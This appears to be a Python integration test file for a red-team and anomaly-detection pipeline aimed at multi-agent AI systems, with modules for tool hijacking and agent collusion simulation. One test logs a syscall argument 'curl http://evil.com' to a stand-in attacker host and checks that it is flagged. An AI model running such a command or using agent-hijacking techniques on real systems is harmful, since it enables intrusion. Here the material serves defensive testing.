"""
Integration tests for ASTRAXIS-AI multi-agent red-team pipeline.

Tests end-to-end component integration: payload generator -> attack graph analyzer
-> sandbox manager -> traffic interceptor -> syscall logger -> anomaly detector -> orchestrator.
"""
import pytest
from astraxis.core.config import AstraxisSettings
from astraxis.core.hasher import ArtifactHasher
from astraxis.graph import AttackGraphBuilder, AttackGraphAnalyzer
from astraxis.redteam import PayloadGenerator, ToolHijacker, AgentCollusionSimulator
from astraxis.sandbox import SandboxManager, SandboxBackend
from astraxis.interceptor import (
    TrafficInterceptor,
    ProtocolType,
    SyscallAuditLogger,
    SyscallType,
    AnomalyDetector
)
from astraxis.orchestrator import OrchestratorEngine

def test_e2e_pipeline_execution():
    """Verify full end-to-end integration flow without errors."""
    # 1. Config & Hasher
    settings = AstraxisSettings()
    hasher = ArtifactHasher()

    # 2. Graph Engine
    builder = AttackGraphBuilder()
    builder.build_default_architecture()
    analyzer = AttackGraphAnalyzer(builder)
    paths = analyzer.find_exploit_paths()
    assert len(paths) > 0

    # 3. Redteam Payloads
    gen = PayloadGenerator()
    payloads = gen.generate_all()
    assert len(payloads) > 0

    # 4. Sandbox Execution
    manager = SandboxManager(force_backend=SandboxBackend.SYNTHETIC)
    exec_res = manager.execute_payload(payloads[0].content)
    assert exec_res.backend == SandboxBackend.SYNTHETIC

    # 5. Traffic Interceptor & Syscall Logging
    ti = TrafficInterceptor()
    event = ti.intercept_request(
        protocol=ProtocolType.HTTP,
        sender="IntegrationAgent",
        endpoint="http://target/api",
        method="/test",
        payload=payloads[0].content
    )
    assert event.event_id is not None

    syscall_log = SyscallAuditLogger()
    sc_event = syscall_log.log_syscall(
        pid=1234,
        syscall=SyscallType.EXECVE,
        arg="curl http://evil.com",
        agent="IntegrationAgent"
    )
    assert sc_event.is_suspicious is True

    # 6. Anomaly Detection
    detector = AnomalyDetector()
    violations = detector.analyze(ti.captured_events, syscall_log.events)
    assert len(violations) >= 1

    # 7. Orchestrator End-to-End Run
    orchestrator = OrchestratorEngine(force_sandbox_backend=SandboxBackend.SYNTHETIC)
    result = orchestrator.run_full_audit()
    assert result.sha256_hash == hasher.hash_dict(result.summary_dict)

def test_orchestrator_multiple_runs():
    """Verify orchestrator produces unique scan IDs and consistent risk scores."""
    orchestrator = OrchestratorEngine(force_sandbox_backend=SandboxBackend.SYNTHETIC)
    res1 = orchestrator.run_full_audit()
    res2 = orchestrator.run_full_audit()

    assert res1.scan_id != res2.scan_id
    assert res1.sha256_hash != res2.sha256_hash
    assert res1.total_payloads == res2.total_payloads
